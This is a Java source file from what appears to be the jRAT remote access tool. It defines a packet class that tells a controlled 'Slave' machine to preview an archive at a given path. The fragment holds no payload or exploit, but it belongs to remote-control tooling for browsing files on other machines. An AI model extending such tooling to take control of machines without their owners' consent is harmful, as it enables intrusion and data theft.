package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class Packet63PreviewArchive implements OutgoingPacket {

	private String file;

	public Packet63PreviewArchive(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 63;
	}

}
